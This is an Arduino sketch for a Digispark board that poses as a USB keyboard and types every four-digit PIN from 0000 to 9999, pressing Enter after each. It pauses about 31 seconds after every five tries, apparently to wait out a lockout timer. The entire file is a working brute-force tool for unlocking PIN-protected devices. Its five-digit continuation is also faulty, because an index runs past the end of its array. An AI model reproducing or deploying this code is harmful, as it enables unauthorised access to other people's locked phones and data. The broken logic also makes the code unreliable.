#include "DigiKeyboard.h"

int pin[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int digit1 = 0;
int digit2 = 0;
int digit3 = 0;
int digit4 = 0;
int digit5 = 0;
int count = 0;
bool key_stroke_e = false;

void setup()
{
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0); // this is generally not necessary but with some older systems
    delay(3000);                   // it seems to prevent missing the first character after a delay
}

void loop()
{
    // After 5 attempts, wait for 30 seconds
    if (count == 5)
    {
        digitalWrite(1, HIGH);
        DigiKeyboard.sendKeyStroke(40);
        delay(31000);
        count = 0;
        digitalWrite(1, LOW);
    }
    /*=========Key out the pin combinations==========*/
    if (key_stroke_e == false)
    {
        DigiKeyboard.sendKeyStroke(pin[digit1]);
        DigiKeyboard.sendKeyStroke(pin[digit2]);
        DigiKeyboard.sendKeyStroke(pin[digit3]);
        DigiKeyboard.sendKeyStroke(pin[digit4]);
    }

    if (key_stroke_e == true)
    {
        DigiKeyboard.sendKeyStroke(pin[digit1]);
        DigiKeyboard.sendKeyStroke(pin[digit2]);
        DigiKeyboard.sendKeyStroke(pin[digit3]);
        DigiKeyboard.sendKeyStroke(pin[digit4]);
        DigiKeyboard.sendKeyStroke(pin[digit5]);
    }
    DigiKeyboard.sendKeyStroke(40);
    delay(1000);
    digit4++;
    count++;
    /*========To count 0000 to 9999 number combinations=======*/
    if (digit4 == 10)
    {
        digit4 = 0;
        digit3++;

        if (digit3 == 10)
        {
            digit3 = 0;
            digit2++;

            if (digit2 == 10)
            {
                digit2 = 0;
                digit1++;

                if (digit1 == 10)
                {

                    key_stroke_e = true;
                    digit5++;

                    if (digit5 == 10)
                    {
                        digit5 = 0;
                    }
                }
            }
        }
    }
}